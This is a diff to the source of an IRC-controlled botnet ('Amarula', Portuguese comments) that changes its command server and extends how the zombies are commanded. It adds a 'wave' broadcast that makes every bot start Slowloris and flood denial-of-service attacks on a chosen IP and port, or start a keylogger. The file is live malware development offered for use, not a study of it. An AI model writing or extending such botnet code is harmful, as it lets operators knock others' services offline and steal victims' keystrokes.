@@ -9,12 +9,11 @@
 #######################################################################################################################
 #                                                                                                                     #
 # -----------------------------------[+] A M A R U L A    I R C    B O T N E T [+] -----------------------------------#
-#                                                  Abacatch Version                                                   #
+#                                                  Plum Version                                                   #
 #                                                                                                                     #
 #######################################################################################################################
 
 import glob                                       # Funcao listArq()
-import logging
 import multiprocessing                            # funcao main(), keylog()
 import os                                         # Funcoes deleteFile(), listArq(), upload(),
 import platform                                   # Variavel pcName
@@ -35,7 +34,7 @@ import threading                                  # Funcao onKey(event)
 #                                              C O N F I G U R A C O E S                                              #
 # --------------------------------------------------------------------------------------------------------------------#
 
-ircServer= "irc.betachat.net"                             # Endereco do servidor IRC.
+ircServer= "irc.underworld.no"                             # Endereco do servidor IRC.
 ircChannel= "#amarula424217"                                  # Canal ao qual o Zumbi ira se conectar.
 channelPwd= ""                                   # Password do canal, caso nao haja, deixar em branco.
 masterName= "Papa Father"                                     # Nome que os Zumbis usarao para chamar voce (n. obrigatorio)
@@ -96,7 +95,6 @@ def conn():
     else:
         ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :ZuMbI\n"))
         ircSock.send(str.encode("NICK "+ botNick +"\n"))
-
 
 
 def deleteFile():
@@ -305,6 +303,7 @@ def init_socket(ip, sport):
     return s
 
 def slowLoris(ip, socket_count, sport):
+# Slowloris attack
 
     for _ in range(socket_count):
         try:
@@ -445,7 +444,6 @@ def main():
             ircSock.send(str.encode("NICK "+ botNick +"\n"))
             join(ircChannel)
 
-        ##################################################################################################
         elif ircMsg.find(str.encode("slow start")) != -1:
             try:
                 p = ircMsgClean.split()
@@ -454,31 +452,28 @@ def main():
                 ip = p[6]
                 sport = int(p[7])
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <slow start> <socket count> <ip> <" + botNick + ">")
+                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <slow start> <socket count> <ip> <port> <" + botNick + ">")
             else:
                 if id == botNick or id == 'wave':
                     pr = multiprocessing.Process(target=slowLoris, args=(ip, socket_count,sport))
                     pr.daemon = True
                     pr.start()
-                    msgSend(ircChannel, "[+] DoS iniciado [+]")
+                    msgSend(ircChannel, "[+] Slowloris iniciado [+]")
 
         elif ircMsg.find(str.encode("slow stop")) != -1:
             try:
                 p = ircMsgClean.split()
-                id = p[2]
+                id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <ddos stop> ")
+                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <slow stop> <" + botNick +">")
             else:
-                for p in multiprocessing.active_children():
-                    p.terminate()
-                    msgSend(ircChannel, "[+] DoS terminado [+]")
+                if id == botNick or id == 'wave':
+                    for p in multiprocessing.active_children():
+                        p.terminate()
+                        msgSend(ircChannel, "[+] Slowloris terminado [+]")
 
 
-
-
-
-
-        elif ircMsg.find(str.encode("ddos start")) != -1:
+        elif ircMsg.find(str.encode("plum start")) != -1:
             try:
                 p = ircMsgClean.split()
                 id = p[8]
@@ -487,25 +482,26 @@ def main():
                 port = int(p[7])
 
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <ddos start> <" + botNick +">")
+                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <plum start> <threads> <ip> <port> <" + botNick +">")
             else:
+                if id == botNick or id == 'wave':
                     pr = multiprocessing.Process(target=plumDos, args=(threads, host, port))
                     pr.daemon = True
                     pr.start()
-                    msgSend(ircChannel, "[+] DoS iniciado [+]")
+                    msgSend(ircChannel, "[+] Plum iniciado [+]")
 
-        elif ircMsg.find(str.encode("ddos stop")) != -1:
+        elif ircMsg.find(str.encode("plum stop")) != -1:
             try:
                 p = ircMsgClean.split()
-                id = p[2]
+                id = p[5]
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <ddos stop> ")
+                msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <plum stop> <" + botNick +"> ")
             else:
-                for p in multiprocessing.active_children():
-                    p.terminate()
-                    msgSend(ircChannel, "[+] DoS terminado [+]")
+                if id == botNick or id == 'wave':
+                    for p in multiprocessing.active_children():
+                        p.terminate()
+                        msgSend(ircChannel, "[+] Plum terminado [+]")
 
-        ################################################################################
 
         elif ircMsg.find(str.encode("keylog start")) != -1:
             try:
@@ -514,7 +510,7 @@ def main():
             except IndexError:
                 msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <keylog start> <" + botNick +">")
             else:
-                if id == botNick:
+                if id == botNick or id == 'wave':
                     pr = multiprocessing.Process(target=keylog)
                     pr.daemon = True
                     pr.start()
@@ -527,7 +523,7 @@ def main():
             except IndexError:
                 msgSend(ircChannel, "[+] Sintaxe Invalida [+] use: <keylog stop> <" + botNick +">")
             else:
-                if id == botNick:
+                if id == botNick or id == 'wave':
                     for p in multiprocessing.active_children():
                         p.terminate()
                         msgSend(ircChannel, "[+] Terminando Keylogger [+]")
